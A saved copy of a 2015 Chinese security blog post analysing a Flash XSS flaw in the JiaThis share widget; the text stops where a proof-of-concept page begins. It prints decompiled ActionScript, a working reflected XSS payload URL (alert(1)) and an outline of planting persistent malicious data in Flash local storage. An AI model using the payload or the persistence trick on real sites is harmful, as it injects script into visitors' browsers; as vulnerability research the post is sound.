@@ -1,0 +1,399 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>对JiaThis Flash XSS的挖掘与分析 | 离别歌</title>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/styles.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/style.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./对JiaThis Flash XSS的挖掘与分析  离别歌/jquery.min.js"></script>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/code.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/button.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./对JiaThis Flash XSS的挖掘与分析  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;text=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;title=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;is_video=false&amp;description=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;title=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;title=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;title=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;title=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/jiathis-fso-flash-xss-rootkit.html&amp;name=%E5%AF%B9JiaThis%20Flash%20XSS%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">对JiaThis Flash XSS的挖掘与分析</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年3月25日 20:06" itemprop="datePublished">
+                    2015 三月 25 20:06
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4767
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/flashxss">flashxss</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>看到360官微在微博上说了， <a href="http://www.jiathis.com/code/swf/m.swf">http://www.jiathis.com/code/swf/m.swf</a> 存在XSS漏洞，可以导致使用了JiaThis的任意网站产生漏洞。得到这个线索，我们来开始顺藤摸瓜，对这个XSS的原理与利用方法进行一次分析。</p>
+<p>这次的分析我想以一个发现者的分析顺序去分析，所以假设我这个时候并不知道JiaThis存在Flash XSS。来到JiaThis的官网，就能很快找到他们提供的代码：</p>
+<div class="codehilite"><pre><span></span><span class="c">&lt;!-- JiaThis Button BEGIN --&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_style"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_qzone"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_tsina"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_tqq"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_weixin"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_renren"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://www.jiathis.com/share"</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis jiathis_txt jtico jtico_jiathis"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_counter_style"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://v3.jiathis.com/code/jia.js?uid=1427098094896152"</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- JiaThis Button END --&gt;</span>
+</pre></div>
+<p>最核心的其实就是http://v3.jiathis.com/code/jia.js?uid=1427098094896152 这个javascript，我们打开发现是加过密的。在tool.lu上不能直接解密，当然这并不是说他不能解密。我们将eval去掉，中间部分运行后，console.log打印出来，即可看见真实源码：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/dc6c1427286088.png"><img alt="QQ20150325-4@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-dc6c1427286088.png"/></a></p>
+<p>将得到的源码美化一下，就可以直接看了。由于代码太长，就不贴出来了。</p>
+<p>大概浏览一遍，并没有什么发现。我们干脆将jiathis的代码放在页面中，查看一下数据包：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/b2411427287202.png"><img alt="QQ20150325-5@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-b2411427287202.png"/></a></p>
+<p>画框的两个，之前没见过，可以研究一下。plugin.client.js解密后，有一段比较有意思：</p>
+<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">(</span><span class="nx">na</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"MSIE"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">SWFID</span><span class="p">)</span> <span class="o">:</span> <span class="nx">d</span><span class="p">[</span><span class="nx">SWFID</span><span class="p">],</span>
+        <span class="nx">fv</span> <span class="o">=</span> <span class="nx">getFV</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">s</span> <span class="o">==</span> <span class="s1">'undefined'</span> <span class="o">||</span> <span class="nx">s</span> <span class="o">==</span> <span class="s1">'null'</span> <span class="o">||</span> <span class="o">!</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">d</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"&lt;div style='position:absolute;width:0px;height:0px;'&gt;&lt;object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' width=0 height=0 id='"</span> <span class="o">+</span> <span class="nx">SWFID</span> <span class="o">+</span> <span class="s2">"' codebase='http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab'&gt;&lt;param name='allowScriptAccess' value='always'&gt;&lt;param name='swLiveConnect' value='true'&gt;&lt;param name='movie' value='"</span> <span class="o">+</span> <span class="nx">fO</span><span class="p">.</span><span class="nx">path</span> <span class="o">+</span> <span class="s2">"'&gt;&lt;param name='FlashVars' value='z=a'&gt;&lt;embed name='"</span> <span class="o">+</span> <span class="nx">SWFID</span> <span class="o">+</span> <span class="s2">"' src='"</span> <span class="o">+</span> <span class="nx">fO</span><span class="p">.</span><span class="nx">path</span> <span class="o">+</span> <span class="s2">"' FlashVars='z=a' width=0 height=0 allowscriptaccess='always' swLiveConnect='true' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer' /&gt;&lt;/object&gt;&lt;/div&gt;"</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">fv</span> <span class="o">!=</span> <span class="s1">'-'</span> <span class="o">&amp;&amp;</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">fv</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^\d+(?=.)/</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">fO</span><span class="p">.</span><span class="nx">su</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">init</span><span class="p">();</span>
+<span class="k">return</span> <span class="p">{</span>
+    <span class="nx">ready</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">fO</span><span class="p">.</span><span class="nx">su</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">d</span><span class="p">[</span><span class="nx">SWFID</span><span class="p">]</span> <span class="o">||</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">SWFID</span><span class="p">),</span>
+                <span class="nx">jid</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">readSharedObject</span><span class="p">(</span><span class="nx">JIDNAME</span><span class="p">),</span>
+                <span class="nx">ut</span> <span class="o">=</span> <span class="nx">getUT</span><span class="p">(</span><span class="nx">jid</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">def</span><span class="p">(</span><span class="nx">jid</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nx">uptUt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">ut</span><span class="p">)</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">$CKE</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'object'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">$CKE</span><span class="p">.</span><span class="nx">jid</span> <span class="o">=</span> <span class="nx">ut</span><span class="p">.</span><span class="nx">jid</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">JIATHISCKMP</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'object'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">JIATHISCKMP</span><span class="p">.</span><span class="nx">mapping</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'function'</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">JIATHISCKMP</span><span class="p">.</span><span class="nx">mapping</span><span class="p">(</span><span class="nx">ut</span><span class="p">.</span><span class="nx">jid</span><span class="p">)</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="nx">reqUT</span><span class="p">(</span><span class="nx">ut</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>加载了一个flash，也就是之前的m.swf，并且allowscriptaccess的值为always，这说明这个页面中的swf是可以执行javascript代码的。在其中看到了一个敏感的名字a.readSharedObject(JIDNAME)。readSharedObject看起来似乎是在flash的LSO对象中读取值的方法。</p>
+<p>将 <a href="http://www.jiathis.com/code/swf/m.swf">http://www.jiathis.com/code/swf/m.swf</a> 反编译，得到如下代码：</p>
+<div class="codehilite"><pre><span></span><span class="n">package</span> <span class="n">m_fla</span> <span class="p">{</span>
+    <span class="kn">import</span> <span class="nn">flash.display.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.net.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">adobe.utils.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.accessibility.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.desktop.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.errors.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.events.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.external.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.filters.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.geom.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.media.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.printing.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.profiler.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.sampler.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.system.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.text.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.text.engine.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.ui.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.utils.</span><span class="o">*</span><span class="p">;</span>
+    <span class="kn">import</span> <span class="nn">flash.xml.</span><span class="o">*</span><span class="p">;</span>
+
+    <span class="n">public</span> <span class="n">dynamic</span> <span class="k">class</span> <span class="nc">MainTimeline</span> <span class="n">extends</span> <span class="n">MovieClip</span> <span class="p">{</span>
+
+        <span class="n">public</span> <span class="n">const</span> <span class="n">appName</span><span class="p">:</span><span class="n">String</span> <span class="o">=</span> <span class="s2">"mao"</span><span class="p">;</span>
+
+        <span class="n">public</span> <span class="n">var</span> <span class="n">mySo</span><span class="p">:</span><span class="n">SharedObject</span><span class="p">;</span>
+
+        <span class="n">public</span> <span class="n">function</span> <span class="n">MainTimeline</span><span class="p">(){</span>
+            <span class="n">addFrameScript</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">frame1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">writeSharedObject</span><span class="p">(</span><span class="n">param1</span><span class="p">:</span><span class="n">String</span><span class="p">,</span> <span class="n">param2</span><span class="p">:</span><span class="n">String</span><span class="p">):</span><span class="n">void</span><span class="p">{</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">=</span> <span class="n">SharedObject</span><span class="o">.</span><span class="n">getLocal</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">appName</span><span class="p">);</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="n">param1</span><span class="p">]</span> <span class="o">=</span> <span class="n">param2</span><span class="p">;</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">function</span> <span class="n">frame1</span><span class="p">(){</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">main</span><span class="p">();</span>
+            <span class="n">stop</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">deleteObjects</span><span class="p">():</span><span class="n">void</span><span class="p">{</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">=</span> <span class="n">SharedObject</span><span class="o">.</span><span class="n">getLocal</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">appName</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">!=</span> <span class="n">null</span><span class="p">){</span>
+                <span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">clear</span><span class="p">();</span>
+            <span class="p">};</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">deleteObject</span><span class="p">(</span><span class="n">param1</span><span class="p">:</span><span class="n">String</span><span class="p">):</span><span class="n">Boolean</span><span class="p">{</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">=</span> <span class="n">SharedObject</span><span class="o">.</span><span class="n">getLocal</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">appName</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(((</span><span class="err">!</span><span class="p">((</span><span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">==</span> <span class="n">null</span><span class="p">)))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="err">!</span><span class="p">((</span><span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="n">param1</span><span class="p">]</span> <span class="o">==</span> <span class="n">null</span><span class="p">))))){</span>
+                <span class="n">delete</span> <span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="n">param1</span><span class="p">];</span>
+                <span class="k">return</span> <span class="p">(</span><span class="n">true</span><span class="p">);</span>
+            <span class="p">};</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">false</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">main</span><span class="p">(){</span>
+            <span class="n">var</span> <span class="n">paramObj</span><span class="p">:</span><span class="o">*</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+            <span class="n">Security</span><span class="o">.</span><span class="n">allowDomain</span><span class="p">(</span><span class="s2">"*"</span><span class="p">);</span>
+            <span class="n">paramObj</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">loaderInfo</span><span class="o">.</span><span class="n">parameters</span><span class="p">;</span>
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">ExternalInterface</span><span class="o">.</span><span class="n">available</span><span class="p">){</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="s2">"writeSharedObject"</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">writeSharedObject</span><span class="p">);</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="s2">"readSharedObject"</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">readSharedObject</span><span class="p">);</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="s2">"readObjects"</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">readObjects</span><span class="p">);</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="s2">"deleteObject"</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">deleteObject</span><span class="p">);</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">addCallback</span><span class="p">(</span><span class="s2">"deleteObjects"</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">deleteObjects</span><span class="p">);</span>
+                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">"_gnayTrack.ready"</span><span class="p">,</span> <span class="n">paramObj</span><span class="p">);</span>
+                <span class="p">};</span>
+            <span class="p">}</span> <span class="n">catch</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="p">};</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">readSharedObject</span><span class="p">(</span><span class="n">param1</span><span class="p">:</span><span class="n">String</span><span class="p">):</span><span class="n">String</span><span class="p">{</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">=</span> <span class="n">SharedObject</span><span class="o">.</span><span class="n">getLocal</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">appName</span><span class="p">);</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">String</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="n">param1</span><span class="p">]));</span>
+        <span class="p">}</span>
+        <span class="n">public</span> <span class="n">function</span> <span class="n">readObjects</span><span class="p">():</span><span class="n">Object</span><span class="p">{</span>
+            <span class="n">this</span><span class="o">.</span><span class="n">mySo</span> <span class="o">=</span> <span class="n">SharedObject</span><span class="o">.</span><span class="n">getLocal</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">appName</span><span class="p">);</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">mySo</span><span class="o">.</span><span class="n">data</span><span class="p">);</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+<span class="p">}</span><span class="o">//</span><span class="n">package</span> <span class="n">m_fla</span>
+</pre></div>
+<p>暂且不看LSO的部分，这里很明显有一个反射型XSS：ExternalInterface.call("_gnayTrack.ready", paramObj);</p>
+<p>paramObj是root.loaderInfo.parameters，将paramObj作为ExternalInterface.call方法的第二个参数，第二个参数的话我们可以用\"的方式逃逸出引号范围，执行javascript代码。</p>
+<p>有人问了，root.loaderInfo.parameters是个对象，怎么传入ExternalInterface.call？ExternalInterface.call的第二个参数应该是一个字符串，但传入对象也是可以的，实际最后执行的时候应该是类似<code>_gnayTrack.ready({"a": "xxxxx"})</code></p>
+<p>所以，我们现在不仅要闭合双引号"，还要闭合一个大括号}和一个小括号)，所以最后的payload比大家以前见到的多了})：</p>
+<div class="codehilite"><pre><span></span>http://www.jiathis.com/code/swf/m.swf?a=\"})))}catch(e){alert(1)}//
+</pre></div>
+<p>弹了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/88c01427288898.png"><img alt="QQ20150325-6@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-88c01427288898.png"/></a> </p>
+<p>这一处应该是一个意外收获。不过收获比较小，因为域是www.jiathis.com，XSS并不能影响到使用jiathis的网站。（除非你将这个swf放在自己的域名下）</p>
+<p>回到刚才说的LSO，由于LSO造成的漏洞乌云上也不少了，比如 <a href="http://wooyun.org/bugs/wooyun-2014-065197"><a href="http://wooyun.org/bugs/wooyun-2014-065197">http://wooyun.org/bugs/wooyun-2014-065197</a></a> 、<a href="http://www.wooyun.org/bugs/wooyun-2013-039481"><a href="http://www.wooyun.org/bugs/wooyun-2013-039481">http://www.wooyun.org/bugs/wooyun-2013-039481</a></a> 等。</p>
+<p>我们看到swf源码中，确实是调用了LSO对象。我们找到对象保存在我们电脑上的文件<code>C:\Users\phithon\AppData\Local\Google\Chrome\User Data\Default\Pepper Data\Shockwave Flash\WritableRoot\#SharedObjects\DR6LLMCM\www.jiathis.com\code\swf\m.swf\mao.sol</code></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/b6c41427289664.png"><img alt="QQ20150325-7@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-b6c41427289664.png"/></a>    </p>
+<p>可以看到保存在LSO的内容实际上就是jid=xxxx，我们在控制台直接调用swf对象获得jid的值也验证了这一点：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/76131427289730.png"><img alt="QQ20150325-8@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-76131427289730.png"/></a></p>
+<p>这就好说了。我们将“脏数据”作为jia的值存入LSO，就能留下一个永久后门。</p>
+<p>简单构造一个POC：</p>
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"uft-8"</span><span class="p">&gt;</span>
